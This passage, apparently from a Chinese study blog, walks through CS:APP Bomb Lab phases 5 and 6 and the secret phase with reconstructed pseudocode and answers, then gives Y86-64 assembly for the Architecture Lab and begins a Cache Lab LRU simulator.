class="number">2</span>;</span><br><span class="line">    var2 = var1+arg2;</span><br><span class="line">    <span class="keyword">if</span>(var2&gt;arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*func4();</span><br><span class="line">    <span class="keyword">if</span>(var2&lt;arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*func4()+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>payload:ionefg</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">phase_5(a1)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//a1即input_string的指针</span></span><br><span class="line">    var1 = a1;</span><br><span class="line">    <span class="keyword">if</span>(string_lenth(a1)!=<span class="number">6</span>)</span><br><span class="line">        exploade_bomb();</span><br><span class="line">    <span class="comment">//将input_string中每个字符的第四位作为下标,从stringarray中取出字符,拷贝到str数组中.</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">            str[i] = StringArray[a1[i++]&amp;<span class="number">0xf</span>];</span><br><span class="line">    }<span class="keyword">while</span>(i&lt;<span class="number">6</span>);</span><br><span class="line">    str[<span class="number">6</span>]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">if</span>(strings_not_equal(str,<span class="string">"flyers"</span>))</span><br><span class="line">        exploade_bomb();</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解密脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">phase_5</span>(<span class="params">goal</span>):</span><br><span class="line">    stringarray = [ch <span class="keyword">for</span> ch <span class="keyword">in</span> string.ascii_lowercase + string.ascii_uppercase + string.digits]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> goal:</span><br><span class="line">        <span class="keyword">for</span> test <span class="keyword">in</span> stringarray:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(test)&amp;<span class="number">0xf</span> == i:</span><br><span class="line">                <span class="built_in">print</span>(test)</span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">phase_5([<span class="number">9</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>函数较长,分成__部分逆向.<br>代码部分是仅表示逻辑的伪代码,分支和循环尽量还原源码,使用下标代替指针增减.</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121206844.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">phase_6(a1)</span><br><span class="line">{</span><br><span class="line">    nums[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(a1,nums);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var1 = nums[k];</span><br><span class="line">        <span class="keyword">if</span>(--var1&gt;<span class="number">5</span>)</span><br><span class="line">            explode_bomb();</span><br><span class="line">        <span class="keyword">if</span>(++i == <span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span>{</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]==num[k])</span><br><span class="line">                    explode_bomb();</span><br><span class="line">        }<span class="keyword">while</span>(++j&lt;=<span class="number">5</span>);</span><br><span class="line">            k+=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>要注意的是,如果循环体的条件在开始时一定成立或为恒真式,汇编代码会省掉(一步)判断,这影响到对while、for等不同循环结构的判断.<br>如for(int i = 0;i!=24;),while(1);</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121500820.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">phase_6(a1)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//第一部分</span></span><br><span class="line">    nums[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(a1,nums);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var1 = nums[k];</span><br><span class="line">        <span class="keyword">if</span>(--var1&gt;<span class="number">5</span>)</span><br><span class="line">            explode_bomb();</span><br><span class="line">        <span class="keyword">if</span>(++i == <span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span>{</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]==num[k])</span><br><span class="line">                    explode_bomb();</span><br><span class="line">        }<span class="keyword">while</span>(++j&lt;=<span class="number">5</span>);</span><br><span class="line">            k+=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二部分</span></span><br><span class="line">    last = <span class="number">7</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">        nums[i] = <span class="number">7</span>-nums[i];</span><br><span class="line">    }<span class="keyword">while</span>(++i!=<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i!=<span class="number">6</span>;++i)</span><br><span class="line">    {</span><br><span class="line">       <span class="keyword">if</span>(nums[i]&gt;<span class="number">1</span>)</span><br><span class="line">       {</span><br><span class="line">            var3 = <span class="number">1</span>;</span><br><span class="line">            var2 = nodes;</span><br><span class="line">            <span class="keyword">do</span>{</span><br><span class="line">                    var2=var2-&gt;next;</span><br><span class="line">            }<span class="keyword">while</span>(++var3!=nums[i]);</span><br><span class="line">       }</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       {</span><br><span class="line">            var2 =  nodes;</span><br><span class="line">       }</span><br><span class="line">       arr[i] = var2;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141513827.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    i = <span class="number">1</span>;</span><br><span class="line">    last = <span class="number">6</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var2 = arr[i];</span><br><span class="line">        arr[j]-&gt;next = var2;</span><br><span class="line">        j = i;</span><br><span class="line">        <span class="keyword">if</span>(++i==last)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    arr[<span class="number">5</span>]-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    i = <span class="number">5</span>;</span><br><span class="line">    var3 = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">        <span class="keyword">if</span>(*var3&lt;*(var3-&gt;next))</span><br><span class="line">            explode_bomb();</span><br><span class="line">        var3 = var3-&gt;next;</span><br><span class="line">    }<span class="keyword">while</span>(--i);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>整个流程:<br>第一部分读入六个数字到栈上的nums数组,检查每个数字都不大于6且各不相等.<br>(其实就是读1-6的数字排列)<br>第二部分将nums数组中每个数num = 7-num.并以此在栈上的arr指针数组中存放对应数字的结点指针.<br>第三部分根据arr指针数组的顺序重构nodes链表.最后遍历链表检查链表中值是否为递减排序.<br>递增排序nodes链表:”3 4 5 6 1 2”,故payload:”4 3 2 1 6 5”<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141525078.png"></p><h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>呃呃有一个隐藏关卡.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141553892.png"><br>发现进入条件是从0x603870读取两个数字和一个字符串,且字符串要为”DrEvil”.查看0x603870内容发现为phase_4的payload(逆一下read_line函数也能算出来),即只需该phase_4的payload为”7 0 DrEvil”即可进入.</p><p>读入一个小于1000的数字.进入fun7.<br>一个递归,观察ptr可以发现是一个二叉排序树的根节点.最后要使返回值为2.num应为22.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141656566.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fun7(ptr,num)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(!ptr)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*ptr&gt;num)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*fun7(*(ptr+<span class="number">8</span>),num);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(*ptr!=num)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*fun7(*(ptr+<span class="number">16</span>),num)+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Lab3-Attack-Lab"><a href="#Lab3-Attack-Lab" class="headerlink" title="Lab3:Attack Lab"></a>Lab3:Attack Lab</h1><p>这个就懒得做了,Linux下基本的ROP和shellcode还是比较熟的.</p><h1 id="Lab4-Architecture-Lab"><a href="#Lab4-Architecture-Lab" class="headerlink" title="Lab4:Architecture Lab"></a>Lab4:Architecture Lab</h1><p>说实话处理器这一章本来就看的云里雾里的.</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><h3 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">ele1:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad ele2</span><br><span class="line">ele2:       </span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">            .quad 0xc00</span><br><span class="line">            .quad 0</span><br><span class="line">main:</span><br><span class="line">            irmovq ele1,%rdi</span><br><span class="line">            call sum_list</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">sum_list:</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            jmp test</span><br><span class="line">test:</span><br><span class="line">            andq %rdi,%rdi</span><br><span class="line">            jne loop</span><br><span class="line">            ret</span><br><span class="line">loop:</span><br><span class="line">            mrmovq (%rdi),%rbx</span><br><span class="line">            addq %rbx,%rax</span><br><span class="line">            mrmovq 8(%rdi),%rdi</span><br><span class="line">            jmp test</span><br><span class="line">            </span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">ele1:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">            .quad 0xc00</span><br><span class="line">            .quad 0</span><br><span class="line">main:</span><br><span class="line">            irmovq ele1,%rdi</span><br><span class="line">            call rsum_list</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">rsum_list:</span><br><span class="line">            xorq %rbx,%rbx</span><br><span class="line">            pushq %rbx</span><br><span class="line">            andq %rdi,%rdi</span><br><span class="line">            jne else</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            popq %rbx</span><br><span class="line">            ret</span><br><span class="line">else:</span><br><span class="line">            mrmovq (%rdi),%rcx</span><br><span class="line">            rmmovq %rcx,(%rsp)</span><br><span class="line">            mrmovq 8(%rdi),%rdi</span><br><span class="line">            call rsum_list</span><br><span class="line">            mrmovq (%rsp),%rbx</span><br><span class="line">            addq %rbx,%rax</span><br><span class="line">            popq %rbx</span><br><span class="line">            ret</span><br><span class="line"></span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:            </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">src:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad 0xc00</span><br><span class="line">dest:        </span><br><span class="line">            .quad 0x111</span><br><span class="line">            .quad 0x222</span><br><span class="line">            .quad 0x333</span><br><span class="line">main:</span><br><span class="line">            irmovq $3,%rdx</span><br><span class="line">            irmovq src,%rdi</span><br><span class="line">            irmovq dest,%rsi</span><br><span class="line">            call copy_block</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">copy_block:</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            jmp condition</span><br><span class="line">condition:</span><br><span class="line">            andq %rdx,%rdx</span><br><span class="line">            jne loop</span><br><span class="line">            ret</span><br><span class="line">loop:</span><br><span class="line">            irmovq $8,%r8</span><br><span class="line">            mrmovq (%rdi),%rcx</span><br><span class="line">            addq %r8,%rdi</span><br><span class="line">            rmmovq %rcx,(%rsi)</span><br><span class="line">            addq %r8,%rsi</span><br><span class="line">            xorq %rcx,%rax</span><br><span class="line">            irmovq $1,%r8</span><br><span class="line">            subq %r8,%rdx</span><br><span class="line">            jmp condition</span><br><span class="line"></span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>根据IADDQ指令执行的六个阶段,添加一下需要用到的sig就行了.<br>挺简单的,这里就不贴出来了.</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><h3 id="iaddq"><a href="#iaddq" class="headerlink" title="iaddq"></a>iaddq</h3><p>和Part B一样添加iaddq指令</p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>先6路+3路循环展开得到CPE9.15、Score27.0</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line"># Loop header</span><br><span class="line">xorq %rax,%rax# count = 0;</span><br><span class="line">andq %rdx,%rdx# len &lt;= 0?</span><br><span class="line">jmp test# if so, goto Done:</span><br><span class="line"></span><br><span class="line"># Loop header</span><br><span class="line">    andq %rdx,%rdx      # len &lt;= 0?</span><br><span class="line">    jmp test</span><br><span class="line">Loop:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop1</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop1:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop2:</span><br><span class="line">    mrmovq 16(%rdi),%r8</span><br><span class="line">    rmmovq %r8,16(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop3</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop3:</span><br><span class="line">    mrmovq 24(%rdi),%r8</span><br><span class="line">    rmmovq %r8,24(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop4</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop4:</span><br><span class="line">    mrmovq 32(%rdi),%r8</span><br><span class="line">    rmmovq %r8,32(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop5</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop5:</span><br><span class="line">    mrmovq 40(%rdi),%r8</span><br><span class="line">    rmmovq %r8,40(%rsi)</span><br><span class="line">    iaddq $48,%rdi</span><br><span class="line">    iaddq $48,%rsi</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle test</span><br><span class="line">    iaddq $1,%rax  </span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">    iaddq $-6, %rdx         # 先减，判断够不够6个</span><br><span class="line">    jge Loop                # 6路展开</span><br><span class="line">    iaddq $6, %rdx</span><br><span class="line">    jmp test2               #剩下的</span><br><span class="line"></span><br><span class="line">L:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle L1</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">L1:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle L2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">L2:</span><br><span class="line">    mrmovq 16(%rdi),%r8</span><br><span class="line">    rmmovq %r8,16(%rsi)</span><br><span class="line">    iaddq $24,%rdi</span><br><span class="line">    iaddq $24,%rsi</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle test2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">test2:</span><br><span class="line">    iaddq $-3, %rdx         # 先减，判断够不够3个</span><br><span class="line">    jge L</span><br><span class="line">    iaddq $2, %rdx          # -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br><span class="line">    je R0</span><br><span class="line">    jl Done</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle R2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">R2:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">    jmp Done</span><br><span class="line">R0:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1,%rax</span><br></pre></td></tr></tbody></table></figure><h3 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h3><p>注意到程序中的这个操作,会触发加载/使用数据冒险,导致插入一个气泡指令.<br>所以我们可以一次性复制两个数据,避免加载/使用数据冒险</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">mrmovq 8(%rdi), %r9</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">rmmovq %r9, 8(%rsi)</span><br></pre></td></tr></tbody></table></figure><p>消除后得分45.4</p><h1 id="Lab5-Cache-Lab"><a href="#Lab5-Cache-Lab" class="headerlink" title="Lab5:Cache Lab"></a>Lab5:Cache Lab</h1><h2 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h2><p>模拟Cache的实现.<br>最开始的时候没有看到实验材料里的这句话,考虑复杂了…</p><blockquote><p>For this this lab, you should assume that memory accesses arealigned properly,  such that a singlememory  access  never  crosses  block  boundaries.   By  making  this  assumption,  you  can  ignore  therequest sizes in thevalgrindtraces</p></blockquote><p>大概实现了这样的数据结构,实验采取的是LRU策略,可以用链表来组织实现,我这里就用时间戳代替了.(ps:用time(NULL)获取的时间戳不够准确会造成多个行的时间戳相同,使用clock()代替或使用全局变量记录次数.)</p><blockquote><p>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182207207.png"></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 